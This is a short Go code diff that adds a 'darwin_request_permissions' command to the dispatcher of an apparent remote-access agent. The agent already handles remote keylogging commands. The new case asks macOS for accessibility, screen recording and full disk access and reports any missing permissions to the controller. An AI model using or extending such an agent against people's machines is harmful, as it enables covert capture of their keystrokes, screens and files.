@@ -2278,6 +2278,33 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return HandleProcessResume(ctx, env, cmdID, resumePid)
 	case "keylog_request_permission":
 		return HandleKeylogRequestPermission(ctx, env, cmdID)
+	case "darwin_request_permissions":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		var requested []string
+		if raw, ok := payload["permissions"].([]interface{}); ok {
+			for _, item := range raw {
+				if key, ok := item.(string); ok && key != "" {
+					requested = append(requested, key)
+				}
+			}
+		}
+		perms := sysinfo.RequestDarwinPermissions(requested)
+		missing := make([]string, 0)
+		for _, key := range []string{"accessibility", "screenRecording", "fullDiskAccess"} {
+			if perms == nil || !perms[key] {
+				missing = append(missing, key)
+			}
+		}
+		detail, _ := json.Marshal(map[string]interface{}{
+			"permissions": perms,
+			"missing":     missing,
+		})
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
+			Type:      "command_result",
+			CommandID: cmdID,
+			OK:        len(missing) == 0,
+			Message:   string(detail),
+		})
 	case "keylog_list":
 		return HandleKeylogList(ctx, env, cmdID)
 	case "keylog_retrieve":
